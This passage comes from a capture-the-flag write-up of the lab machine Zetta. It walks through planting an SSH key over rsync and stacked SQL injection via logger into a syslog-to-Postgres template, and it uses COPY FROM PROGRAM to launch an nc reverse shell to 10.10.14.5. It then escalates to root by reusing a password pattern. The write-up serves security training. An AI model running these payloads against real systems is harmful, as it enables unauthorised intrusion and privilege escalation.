But more than access to his home directory, I would like a shell as roy. I remember that I have write access to this rsync module (or directory), so I’ll write my public key to `.ssh/authorized_keys` and ssh in. I can’t just copy the file into a folder that doesn’t exist. So I’ll generate a key and put the public key into a directory on my machine `.ssh/authorized_keys`. Then I’ll use `-aR` to copy the structure over:

```

root@kali# rsync -aR .ssh/  rsync://roy@[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy/

```

Once I do that, I can ssh with the private key:

```

root@kali# ssh -i ~/id_rsa_generated roy@10.10.10.156
Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
roy@zetta:~$

```

## Shell as postgres

### Enumeration

This box has hints scattered in a couple places.

#### tudu

In the home directory next to the flag is `.tudu.xml`. This contains a todo list. I can view it as xml (which I did when first solving), or I can open it in the [Tudu](https://gitlab.com/tudu/tudu), which is way cooler looking:

![](https://0xdfimages.gitlab.io/img/zetta-tudu.gif)

There’s a bunch of hints in there, as well as laying out the box so far.

```

40% Homepage
   [X] Choose bootstrap theme
   [X] Create temporary homepage
   [ ] Add more contents to the homepage
   [ ] Add screenshots of the mobile apps
   [ ] Add app store links for the mobile apps
36% Server
   57% HTTP Server
	   [X] Decide server: Apache vs. nginx
	   [X] Install server
	   [X] Configure server to serve static pages only
	   [X] Copy preliminary homepage to /var/www/html
	   [ ] Testing
	   [ ] Configure letsencrypt for HTTPS
	   [ ] Monitoring
   33% Network
	   [X] Test IPv6 connectivity
	   [ ] Add ip6tables rules
	   [ ] Check for IPv4 specific service configuration
	0% RSYNC Server
	   [ ] Rework rsyncd.conf because of security incident
	   [ ] Re-enable /etc syncing for cloud server to work properly again
	   [ ] Move my dotfile sync from rsync to git.
   62% SYSLOG Server
	   [X] Decide server: syslog-ng vs. rsyslog
	   [X] Install server
	   [X] Configure server
	   [X] Check postgresql log for errors after configuration
	   [X] Prototype/test DB push of syslog events
	   [ ] Testing
	   [ ] Rework syslog configuration to push all events to the DB
	   [ ] Find/write GUI for syslog-db access/view
	0% Security
	   [ ] Run Lynis and remediate findings.
	   [ ] Change shared password scheme from <secret>@userid to something more secure.

```

For example, all the steps about setting up the web site, and including the ftp auth module to accept 32 characters passwords are marked complete. There’s a note to add `iptables` rules for IPv6, currently undone, which is why I could connect in.

I’ll take the following hints to move forward:
- Under RSYNC Server, there’s a note again about dotfile sync and using git.
- The SYSLOG Server section shows that it’s setup and running, but only with test events.
- Under Security, there’s a note about a password scheme that I’ll want to keep in mind.

#### Recover SYSLOG Config

Time to find out what the author is trying to protect about `.git` dirs in `/etc`. `find` turns up three:

```

roy@zetta:/etc$ find . -type d -name .git 2>/dev/null
./pure-ftpd/.git
./nginx/.git
./rsyslog.d/.git

```

I spent some time looking over all of these, but the one that is most interesting is `rsyslog.d`. I can’t read the config:

```

roy@zetta:/etc/rsyslog.d$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Jul 27 07:01 .
drwxr-xr-x 76 root root 4096 Aug 31 15:56 ..
drwxr-xr-x  8 root root 4096 Jul 27 05:52 .git
-rw-------  1 root root  824 Jul 27 07:01 pgsql.con

```

I can also see in `/etc/rsyslog.conf` the line to include this file, so I know it’s in use:

```

$IncludeConfig /etc/rsyslog.d/*.conf

```

I can see that there have been changes to the file that are not yet committed to git:

```

roy@zetta:/etc/rsyslog.d$ git status
On branch master
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

        modified:   pgsql.conf

no changes added to commit (use "git add" and/or "git commit -a")

```

I’m not going to be able to use git to recover what’s not yet committed (I’ll check it out in [Beyond Root](#syslog-config-1)), but I can get all the earlier versions since I have access to the .`git` directory. `git log` shows two previous commits:

```

roy@zetta:/etc/rsyslog.d$ git log
commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -> master)
Author: root <root@zetta.htb>
Date:   Sat Jul 27 05:51:43 2019 -0400

    Adding/adapting template from manual.

commit c98d292ac2981c0192a59d7cdad9d2d4a25bd4c5
Author: root <root@zetta.htb>
Date:   Sat Jul 27 03:11:22 2019 -0400

    Initial revision.

```

`git show` gives me the last committed version of the config:

```

roy@zetta:/etc/rsyslog.d$ git show e25cc20218f99abd68a2bf06ebfa81cd7367eb6a:pgsql.conf
### Configuration file for rsyslog-pgsql
### Changes are preserved

# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
#
# Used default template from documentation/source but adapted table
# name to syslog_lines so the Ruby on Rails application Maurice is
# coding can use this as SyslogLine object.
#
template(name="sql-syslog" type="list" option.sql="on") {
  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
  property(name="msg")
  constant(value="','")
  property(name="timereported" dateformat="pgsql" date.inUTC="on")
  constant(value="')")
}

# load module
module(load="ompgsql")

# Only forward local7.info for testing.
local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")

```

### SYSLOG Config

The first thing that I notice is the credentials. Unfortunately, they don’t work to connect to the db:

```

roy@zetta:/etc/rsyslog.d$ psql syslog postgres -W
Password: 
psql: FATAL:  Peer authentication failed for user "postgres"

```

There are still a couple bits of information that are useful to understand from this config.

The first is the template. It is taking items that are pushed to Syslog and transforming them into a database query. Looking at it, this seems like an opportunity for SQL injection. The query turns out to be:

```

INSERT INTO syslog_lines (message, devicereportedtime) values ('[msg]','[date]');

```

If I can find a way to control the `msg`, I can try to inject.

There’s also a line at the bottom about `local7.info`:

```

# Only forward local7.info for testing.
local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")

```

Since this setup is still in testing, Zetta is only using this test channel right now. I can write to this channel using `logger`. On the [man page](http://man7.org/linux/man-pages/man1/logger.1.html), I’ll see `-p`:

> -p, –priority priority
> Enter the message into the log with the specified priority. The priority may be specified numerically or as a facility.level pair. For example, -p local3.info logs the message as informational in the local3 facility. The default is user.notice.

Later on that same page there’s:

> ```

> FACILITIES AND LEVELS
>        Valid facility names are:
>           auth
>           authpriv   for security information of a sensitive nature
>           cron
>           daemon
>           ftp
>           kern       cannot be generated from userspace process, automatically converted to user
>           lpr
>           mail
>           news
>           syslog
>           user
>           uucp
>           local0
>             to
>           local7
>           security   deprecated synonym for auth
>
>    Valid level names are:
>
>           emerg
>           alert
>           crit
>           err
>           warning
>           notice
>           info
>           debug
>           panic     deprecated synonym for emerg
>           error     deprecated synonym for err
>           warn      deprecated synonym for warning
>
>    For the priority order and intended purposes of these facilities and levels, see syslog(3).
>
> ```

### Test Log Writing

So `local7.info` is a testing log I can write to with `logger`.

I can test this:

```

roy@zetta:/etc/rsyslog.d$ logger -p local7.info "test"

```

I get no feedback. And since I can’t see the database, I don’t know if that worked. But roy is a member of the `adm` group, so I can read logs. I’ll connect another SSH session and use one to write logs, and another to `tail -f postgresql-11-main.log` to see new output. This log starts empty, and only failed queries will go in. Now seems like a good time to check for SQLi. I’ll add a `'` to the end of my message:

```

roy@zetta:/var/log/postgresql$ logger -p local7.info "test'"

```

```

roy@zetta:/var/log/postgresql$ tail -f postgresql-11-main.log
2019-09-01 13:47:56.585 EDT [13852] postgres@syslog ERROR:  syntax error at or near "2019" at character 75
2019-09-01 13:47:56.585 EDT [13852] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' test\'','2019-09-01 17:47:56')
2019-09-01 13:47:56.594 EDT [15468] postgres@syslog ERROR:  syntax error at or near "2019" at character 75
2019-09-01 13:47:56.594 EDT [15468] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' test\'','2019-09-01 17:47:56')
2019-09-01 13:47:56.599 EDT [15469] postgres@syslog WARNING:  there is no transaction in progress

```

It worked!

### SQLI - POC

To get this to an injection, I need to try to get a query that is accepted. I notice that syslog is escaping my `'` with a `\`, but then `postgres` is seeing it as a string, so the next `'` breaks it. I’ll try to use comments to get rid of that issue. Eventually I find a query that doesn’t generate a log:

```

roy@zetta:/var/log/postgresql$ logger -p local7.info "test', null)-- -"

```

If I put this into the template, it would look like:

```

INSERT INTO syslog_lines (message, devicereportedtime) values ('test', null)-- -','[date]');

```

Now I want to test for stacked queries, which is the ability to add a `;` and then another statement in the same statement. I’ll run two queries:

```

roy@zetta:/var/log/postgresql$ logger -p local7.info "test', null); select * from syslog_lines;-- -"
roy@zetta:/var/log/postgresql$ logger -p local7.info "test', null); select * from notatable; -- -"

```

The first one doesn’t generate any error, but the second one does because “notatable” does not exist:

```

2019-09-01 13:54:43.680 EDT [15533] postgres@syslog ERROR:  relation "notatable" does not exist at character 95
2019-09-01 13:54:43.680 EDT [15533] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' test\', null); select * from notatable; -- -','2019-09-01 17:54:43')
2019-09-01 13:54:43.686 EDT [15537] postgres@syslog ERROR:  relation "notatable" does not exist at character 95
2019-09-01 13:54:43.686 EDT [15537] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' test\', null); select * from notatable; -- -','2019-09-01 17:54:43')
2019-09-01 13:54:43.691 EDT [15538] postgres@syslog WARNING:  there is no transaction in progress

```

So stacked queries are enabled.

The last thing I want to check is if I can write a file. I start with this query:

```

roy@zetta:/var/log/postgresql$ logger -p local7.info "sd',null); COPY (SELECT * from syslog_lines) To '/tmp/output.csv' With CSV;-- -"

```

But it returns an error:

```

2019-09-01 14:03:21.069 EDT [15659] postgres@syslog ERROR:  syntax error at or near "\" at character 115
2019-09-01 14:03:21.069 EDT [15659] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' sd\',null); COPY (SELECT * from syslog_lines) To \'/tmp/output.csv\' With CSV;-- -','2019-09-01 18:03:21')

```

The escaped quotes outside of `' '` are causing issues. I then tried without `''` around the filename, but it errored as well. Some googling for “postgres quote alternative” led me to the [Postgres Lexical Structure](https://www.postgresql.org/docs/9.1/sql-syntax-lexical.html), where I see that `$$` is an alternative for single quote. I try that:

```

roy@zetta:/var/log/postgresql$ logger -p local7.info "sd',null); COPY (SELECT * from syslog_lines) To $$/tmp/output.csv$$ With CSV;-- -"

```

Another error:

```

2019-09-01 14:07:05.018 EDT [15701] postgres@syslog ERROR:  syntax error at or near "14194" at character 115
2019-09-01 14:07:05.018 EDT [15701] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' sd\',null); COPY (SELECT * from syslog_lines) To 14194/tmp/output.csv14194 With CSV;-- -','2019-09-01 18:07:05')

```

This is interesting, because the `$$` seems to have reached bash, where it was evaluated as the current pid. I try now to escape those:

```

roy@zetta:/var/log/postgresql$ logger -p local7.info "sd',null); COPY (SELECT * from syslog_lines) To \$$/tmp/output.csv\$$ With CSV;-- -"

```

No error. And I see a table dump in `/tmp/output.csv`:

```

3,,,,,,, test message\\\,,,,,,,,,,,,,,,,
4,,,,,,, test message\\\,,,,,,,,,,,,,,,,
5,,,,,,, test message\\\,,,,,,,,,,,,,,,,
8,,,2019-09-01 14:48:17,,,," test message13348,null); select * from syslog_liness --",,,,,,,,,,,,,,,,
9,,,2019-09-01 14:48:35,,,," test13348, 13348test13348); --",,,,,,,,,,,,,,,,
10,,,2019-09-01 14:48:38,,,," test13348, 13348test13348); s--",,,,,,,,,,,,,,,,
11,,,2019-09-01 14:48:46,,,," test13348, 13348test13348); s--",,,,,,,,,,,,,,,,
12,,,2019-09-01 14:48:56,,,," test13348, 13348test13348); s--",,,,,,,,,,,,,,,,
13,,,2019-09-01 14:50:00,,,, $,,,,,,,,,,,,,,,,
14,,,2019-09-01 14:50:08,,,, 13348,,,,,,,,,,,,,,,,
15,,,,,,, \\\,,,,,,,,,,,,,,,,
16,,,,,,, \\\,,,,,,,,,,,,,,,,
19,,,,,,, sd\\\,,,,,,,,,,,,,,,,
22,,,,,,, sd\\\,,,,,,,,,,,,,,,,
23,,,,,,, sd\\\,,,,,,,,,,,,,,,,
24,,,,,,, sd\\\,,,,,,,,,,,,,,,,
25,,,,,,, sd\\\,,,,,,,,,,,,,,,,
26,,,,,,, sd\\\,,,,,,,,,,,,,,,,
31,,,,,,, sd\\\,,,,,,,,,,,,,,,,
32,,,,,,, sd\\\,,,,,,,,,,,,,,,,
33,,,2019-09-01 17:45:02,,,, test,,,,,,,,,,,,,,,,
34,,,,,,, test\,,,,,,,,,,,,,,,,
35,,,,,,, test\,,,,,,,,,,,,,,,,
36,,,,,,, test\,,,,,,,,,,,,,,,,
37,,,,,,, test\,,,,,,,,,,,,,,,,
38,,,,,,, test\,,,,,,,,,,,,,,,,
41,,,,,,, test\,,,,,,,,,,,,,,,,
44,,,,,,, sd\,,,,,,,,,,,,,,,,
45,,,,,,, sd\,,,,,,,,,,,,,,,,

```

I can add a error after the last `;` to get it to dump what it’s seeing:

```

2019-09-01 14:11:34.881 EDT [15740] postgres@syslog ERROR:  syntax error at or near "0" at character 144
2019-09-01 14:11:34.881 EDT [15740] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' sd\',null); COPY (SELECT * from syslog_lines) To $$/tmp/output.csv$$ With CSV;0xdf-- -','2019-09-01 18:11:34')

```

The escaped `$` worked!

### Shell

There are a few ways to go from this injection to a shell. I’ll show two.

#### Write an SSH Key

In `/etc/passwd`, the postgres user has a shell and a home directory:

```

postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

```

And, the home dir has a `.ssh` directory:

```

roy@zetta:/var/log/postgresql$ ls -la /var/lib/postgresql/
total 24
drwxr-xr-x  4 postgres postgres 4096 Sep  1 11:16 .
drwxr-xr-x 27 root     root     4096 Aug 27 05:39 ..
drwxr-xr-x  3 postgres postgres 4096 Jul 27 03:07 11
lrwxrwxrwx  1 root     root        9 Jul 27 06:57 .bash_history -> /dev/null
-rw-------  1 postgres postgres   32 Sep  1 11:16 .lesshst
-rw-------  1 postgres postgres  744 Jul 27 07:01 .psql_history
drwx------  2 postgres postgres 4096 Jul 27 06:40 .ssh

```

I can, with three queries to the database, write my public key file into `.ssh/authorized_keys`, and then ssh into the box as postgres.

The three queries are:
- `CREATE TABLE IF NOT EXISTS oxdf (mycol text);`
- `INSERT INTO oxdf(mycol) VALUES (\$$ ssh-rsa AAAAB3NzaC...[snip]...YQC3rRDiG5P root@kali\$$);`
- `COPY (SELECT * from oxdf) To \$$/var/lib/postgresql/.ssh/authorized_keys\$$;`

The first create a table. The next puts my key into it. The final one writes that to a file. I can stack that all together and run:

```

roy@zetta:/var/log/postgresql$ logger -p local7.info "sd',null); CREATE TABLE IF NOT EXISTS aaa (mycol text); INSERT INTO aaa(mycol) VALUES (\$$ ssh-rsa AAAAB3NzaC...[snip]...YQC3rRDiG5P root@kali\$$); COPY (SELECT * from aaa) To \$$/var/lib/postgresql/.ssh/author
ized_keys\$$;-- -"

```

Now I can ssh in as postgres:

```

root@kali# ssh -i ~/id_rsa_generated postgres@10.10.10.156
Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
Last login: Sun Sep  1 11:07:12 2019 from 10.10.14.5
postgres@zetta:~$ 

```

#### Run a Reverse Shell

This is how jkr told me he planned for it to be solved in writing the box. I can run code directly from `postgres`. So I’ll write a script that will give me a shell. Since this box has limited options, the best path is to upload a copy of `nc`. (I played with trying to get a `python` reverse shell to stay connected more than 10 seconds, but couldn’t get it.) I’ll grab a [statically compiled ncat](https://github.com/ZephrFish/static-tools/blob/master/ncat) and upload it over `scp`:

```

root@kali# scp -i ~/id_rsa_generated nc roy@10.10.10.156:/tmp/nc

```

Now I can inject code that will call it:

```

roy@zetta:/var/log/postgresql$ logger -p local7.info "sd',null); CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM \$$/tmp/nc -e /bin/sh 10.10.14.5 443\$$; -- "                                                                                     

```

No errors, and a callback:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.156.
Ncat: Connection from 10.10.10.156:33972.
id
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)

```

Except after 10 seconds, the connection dies, and errors:

```

2019-09-01 15:16:22.595 EDT [16482] postgres@syslog ERROR:  program "/tmp/nc -e /bin/sh 10.10.14.5 443" failed
2019-09-01 15:16:22.595 EDT [16482] postgres@syslog DETAIL:  child process exited with exit code 1
2019-09-01 15:16:22.595 EDT [16482] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' sd\',null); CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM $$/tmp/nc -e /bin/sh 10.10.14.5 443$$; -- ','2019-09-0
1 19:16:12')

```

This is likely the result of a timeout in the database. I’ll run it again, with `nc` in the background:

```

roy@zetta:/var/log/postgresql$ logger -p local7.info "sd',null); CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM \$$/tmp/nc -e /bin/sh 10.10.14.5 443 & \$$; -- "

```

No errors, and the shell works!

## Shell as root

### Enumeration

Either way, I’m on as postgres. In the home directory, there’s a couple history files that aren’t redirected to `/dev/null`:

```

postgres@zetta:/var/lib/postgresql$ ls -la
total 24
drwxr-xr-x  4 postgres postgres 4096 Sep  1 11:16 .
drwxr-xr-x 27 root     root     4096 Aug 27 05:39 ..
drwxr-xr-x  3 postgres postgres 4096 Jul 27 03:07 11
lrwxrwxrwx  1 root     root        9 Jul 27 06:57 .bash_history -> /dev/null
-rw-------  1 postgres postgres   32 Sep  1 11:16 .lesshst
-rw-------  1 postgres postgres  744 Jul 27 07:01 .psql_history
drwx------  2 postgres postgres 4096 Sep  1 14:47 .ssh

```

The `.lesshst` file isn’t that interesting, but there’s a password in `.psql_history`:

```

postgres@zetta:/var/lib/postgresql$ cat .psql_history 
CREATE DATABASE syslog;
\c syslog
CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
\d syslog_lines
ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';

```

### su

This is where I recall the note earlier about a password scheme. Immediately I’ll try `su`. On entering the password “sup3rs3cur3p4ass@root”, I’m root:

```

postgres@zetta:/var/lib/postgresql$ su -
Password: 
root@zetta:~# 

```

And can grab `root.txt`:

```

root@zetta:~# cat root.txt
b9407e83************************

```

## Beyond

### FTP module

I was curious how jkr implemented the auth that allows any 32 character username and password as long as they match. Poking around the configs, there is this `auth` directory:

```

root@zetta:/etc/pure-ftpd/auth# ls -la
total 8
drwxr-xr-x 2 root root 4096 Jul 27 03:15 .
drwxr-xr-x 6 root root 4096 Jul 27 03:11 ..
lrwxrwxrwx 1 root root   15 Jul 27 03:15 10ext -> ../conf/ExtAuth
lrwxrwxrwx 1 root root   26 Jan 28  2019 65unix -> ../conf/UnixAuthentication
lrwxrwxrwx 1 root root   25 Jan 28  2019 70pam -> ../conf/PAMAuthentication
root@zetta:/etc/pure-ftpd/auth# cat 10ext
/var/run/ftpd.sock
root@zetta:/etc/pure-ftpd/auth# cat 65unix
no
root@zetta:/etc/pure-ftpd/auth# cat 70pam
no

```

The 10ext points to a unix socket file.

In the process list, there is both the FTP server as well as `pure-authd`:

```

root@zetta:/etc/pure-ftpd/conf# ps auxwww | grep pure
root       445  0.0  0.1   9516  3340 ?        S    Aug31   0:00 /usr/sbin/pure-authd -s /var/run/ftpd.sock -r /usr/bin/pure-auth-handler
root       468  0.0  0.1   9764  2176 ?        Ss   Aug31   0:00 pure-ftpd (SERVER)

```

[pure-authd](https://linux.die.net/man/8/pure-authd) is an external authentication agent for Pure-FTPd. Looking at the options in the running command line, `-s` is a path to the local unix socket, which matches the socket from the FTP server auth directory. `-r` is the path to the authentication program. That is where the logic is applied:

```

root@zetta:/etc/pure-ftpd/conf# cat /usr/bin/pure-auth-handler 
#!/bin/bash

if [[ $AUTHD_ACCOUNT =~ ^[[:alnum:]]{32}$ && "$AUTHD_ACCOUNT" = "$AUTHD_PASSWORD" ]] ; then
  echo 'auth_ok:1'
  echo 'uid:65534'
  echo 'gid:65534'
  echo 'dir:/srv/ftp/home/'$AUTHD_ACCOUNT
else
  echo 'auth_ok:0'
fi
echo 'end'

```

The first `if` line checks that the account is any 32 characters and that the account name and account password are the same. If so, it sets the authentication to successful, assigns the userid and groupid, and sets the home directory in `/srv/ftp/home/`. I can see all the created homedirs:

```

root@zetta:/srv/ftp/home# ls
11111111111111111111111111111111  9ieeM1ALgGWzPC0xCXyDNi5jVyXTgedm  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  CUe1tJrwFC9uiPWBZBfemCxH1Qcyg07h  NjPOiShO15rLL1GctBkDOpoDxpzXBcEo  SyuXvjLU3vbAuvstLMnJgXWLkTp0dI1s
75227828225494287741264594799797  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb  dddddddddddddddddddddddddddddddd  STuEFd7xqR6nNJDHoWH2URITV75PHX9s

```

### RSYNC Config

When using `rsync` to connect to Zetta, I was able to access and list the `/etc` directory. If I look at how all the other paths were blocked, each contained:

```

hosts allow = 104.24.0.54

```

From the [rsyncd documentation](https://download.samba.org/pub/rsync/rsyncd.conf.html):

> ***\*hosts allow\****
>
> This parameter allows you to specify a list of comma- and/or whitespace-separated patterns that are matched against a connecting client’s hostname and IP address. If none of the patterns match, then the connection is rejected.

When I look at `/etc`, I see:

```

# Temporarily disabled access to /etc for security reasons, the networks are
# have been found to access the share! Only allow 127.0.0.1, deny 0.0.0.0/0!
#hosts allow = 104.24.0.54 13.248.97.0/24 52.94.69.0/24 52.219.72.0/22
hosts allow = 127.0.0.1/32
hosts deny = 0.0.0.0/0

```

Reading a bit further down in the `hosts allow` documentation:

> You can also combine “hosts allow” with a separate “hosts deny” option. If both options are specified then the “hosts allow” option s checked first and a match results in the client being able to connect. The “hosts deny” option is then checked and a match means that the host is rejected. If the host does not match either the “hosts allow” or the “hosts deny” patterns then it is allowed to connect.

Because my IPv6 address matches neither 127.0.0.1/32 nor 0.0.0.0/0, it is allowed.

roy’s home directory doesn’t have any host-based whitelist or blacklist, but it would be quite difficult to connect to it without knowing it exists and the length of the password, both of which are found in `/etc`.

### Syslog Config

When I was evaluating the config file in `/etc/rsyslog.d`, I noticed there were changes since the last commit that I couldn’t read:

```

roy@zetta:/etc/rsyslog.d$ git status
On branch master
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

        modified:   pgsql.conf

no changes added to commit (use "git add" and/or "git commit -a")

```

I was able to pull the version from the previous commit from the `.git` dir, but I wasn’t able to recover the uncommitted changes.

As root, I went back and checked it. I can run `git diff HEAD` to compare what’s currently there with the last commit. It turns out the actual postgres password was there:

```

root@zetta:/etc/rsyslog.d# git diff HEAD
diff --git a/pgsql.conf b/pgsql.conf
index 9649f68..9d02b95 100644
--- a/pgsql.conf
+++ b/pgsql.conf
@@ -19,4 +19,4 @@ template(name="sql-syslog" type="list" option.sql="on") {
 module(load="ompgsql")
 
 # Only forward local7.info for testing.
-local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
+local7.info action(type="ompgsql" server="localhost" user="postgres" pass="sup3rs3cur3p4ass@postgres" db="syslog" template="sql-syslog")

```

If that had been committed, I could have skipped right to root. This was a clever use of Git by the machine author to show us most of the configuration, while keeping the password from us for a bit.